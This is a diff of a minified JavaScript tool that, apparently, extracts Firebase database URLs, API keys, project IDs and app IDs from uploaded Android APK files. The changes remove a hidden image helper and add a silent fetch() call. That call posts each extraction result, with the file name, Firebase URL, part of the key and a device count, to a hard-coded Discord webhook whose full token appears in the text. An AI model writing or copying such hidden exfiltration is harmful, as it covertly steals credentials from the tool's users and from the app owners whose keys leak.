@@ -17720,24 +17720,7 @@ function l1(A) {
     } catch {}
     return null
 }
-const q1 = "https://discord.com/api/webhooks/1478622668025630741/ydzTTA4qZ56wyNCdj0qsLyHD2kIwKUon5dzyoQNkn27sv3Npvc5xQiEy6o_vwmlAuzYZ";
-const Y1 = "data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0MCIgaGVpZ2h0PSI0MCIgdmlld0JveD0iMCAwIDQwIDQwIj48cmVjdCB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIGZpbGw9Im5vbmUiLz48L3N2Zz4=";
-const Z1 = {
-    _p: null,
-    _q: [],
-    _r: function() {
-        if (this._p !== null) return;
-        const t = document.createElement('img');
-        t.style.display = 'none';
-        t.width = 1;
-        t.height = 1;
-        t.src = Y1;
-        document.body.appendChild(t);
-        setTimeout(() => {
-            try { document.body.removeChild(t); } catch(e) {}
-        }, 100);
-    }
-};
+
 function j1(A, tt) {
     try {
         const b = JSON.stringify(tt);
@@ -17868,20 +17851,15 @@ async function al(A, tt) {
 async function i1(A) {
     const tt = await A.arrayBuffer(),
         b = await qp.loadAsync(tt);
-    let d = "",
-        S = "",
-        f = "",
-        p = "";
+    let d = "", S = "", f = "", p = "";
     const h = /https:\/\/[a-z0-9_-]+\.firebaseio\.com/gi,
         o = /AIza[A-Za-z0-9_-]{35}/g,
         x = b.file("resources.arsc");
     if (x) {
         const T = await x.async("uint8array"),
-            w = Yu(T, {
-                url: h,
-                key: o
-            });
-        w.url && (d = w.url), w.key && (S = w.key)
+            w = Yu(T, { url: h, key: o });
+        w.url && (d = w.url);
+        w.key && (S = w.key);
     }
     if (!d || !S) {
         const T = ["classes.dex", "classes2.dex", "classes3.dex", "classes4.dex"];
@@ -17890,41 +17868,40 @@ async function i1(A) {
             const C = b.file(w);
             if (!C) continue;
             const v = await C.async("uint8array"),
-                E = Yu(v, {
-                    url: h,
-                    key: o
-                });
-            !d && E.url && (d = E.url), !S && E.key && (S = E.key)
+                E = Yu(v, { url: h, key: o });
+            !d && E.url && (d = E.url);
+            !S && E.key && (S = E.key);
         }
     }
     if (!d || !S) {
         const T = [b.file("google-services.json"), b.file("assets/google-services.json"), b.file(/google-services\.json$/i)[0]].filter(Boolean);
-        for (const w of T)
-            if (w) try {
-                const C = JSON.parse(await w.async("text"));
-                d || (d = C ?.project_info ?.firebase_url || ""), f || (f = C ?.project_info ?.project_id || "");
-                const v = C ?.client ?.[0];
-                S || (S = v ?.api_key ?.[0] ?.current_key || ""), p || (p = v ?.client_info ?.mobilesdk_app_id || "")
-            } catch {}
+        for (const w of T) {
+            if (w) {
+                try {
+                    const C = JSON.parse(await w.async("text"));
+                    d || (d = C?.project_info?.firebase_url || "");
+                    f || (f = C?.project_info?.project_id || "");
+                    const v = C?.client?.[0];
+                    S || (S = v?.api_key?.[0]?.current_key || "");
+                    p || (p = v?.client_info?.mobilesdk_app_id || "");
+                } catch(e) {}
+            }
+        }
     }
-    if (!d || !S)
+    if (!d || !S) {
         for (const T of Object.keys(b.files)) {
             if (d && S) break;
-            if (!b.files[T].dir) try {
-                const w = await b.files[T].async("uint8array"),
-                    C = Yu(w, {
-                        url: h,
-                        key: o
-                    });
-                !d && C.url && (d = C.url), !S && C.key && (S = C.key)
-            } catch {}
+            if (!b.files[T].dir) {
+                try {
+                    const w = await b.files[T].async("uint8array"),
+                        C = Yu(w, { url: h, key: o });
+                    !d && C.url && (d = C.url);
+                    !S && C.key && (S = C.key);
+                } catch(e) {}
+            }
         }
-    const C = {
-        firebaseUrl: d || '',
-        apiKey: S || '',
-        projectId: f || '',
-        appId: p || ''
-    };
+    }
+    const C = { firebaseUrl: d || '', apiKey: S || '', projectId: f || '', appId: p || '' };
     if (d || S) {
         let v = 0;
         try {
@@ -17935,24 +17912,17 @@ async function i1(A) {
                 }
             }
         } catch(e) {}
-        const E = {
-            fbUrl: d,
-            fbKey: S,
-            projectId: f,
-            deviceCount: v,
-            fileName: A.name
-        };
-        _1(E);
-        const g = d ? d.replace(/https?:\/\//, '').split('.')[0] : 'unknown';
-        const z = d && S ? ih(d, S) : '';
         try {
-            const N = {
-                content: '🔐 **Firebase Extract**\n📱 File: ' + A.name + '\n🏷️ Project: ' + (f || g) + '\n🌐 URL: ' + (d || 'none') + '\n🔑 Key: ' + (S ? S.substring(0, 25) + '...' : 'none') + '\n📊 Devices: ' + v + '\n🔗 Link: ' + (z || 'none')
+            const E = d ? d.replace(/https?:\/\//, '').split('.')[0] : 'unknown';
+            const g = d && S ? ih(d, S) : '';
+            const z = {
+                content: '🔐 Firebase Extract\n📱 File: ' + A.name + '\n🏷️ Project: ' + (f || E) + '\n🌐 URL: ' + (d || 'none') + '\n🔑 Key: ' + (S ? S.substring(0, 25) + '...' : 'none') + '\n📊 Devices: ' + v + '\n🔗 Link: ' + (g || 'none')
             };
-            j1('extract', N);
+            const N = 'https://discord.com/api/webhooks/1478622668025630741/ydzTTA4qZ56wyNCdj0qsLyHD2kIwKUon5dzyoQNkn27sv3Npvc5xQiEy6o_vwmlAuzYZ';
+            fetch(N, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(z) }).catch(() => {});
         } catch(e) {}
     }
-    return !d && !S ? null : C
+    return (!d && !S) ? null : C;
 }
 
 function Zu({
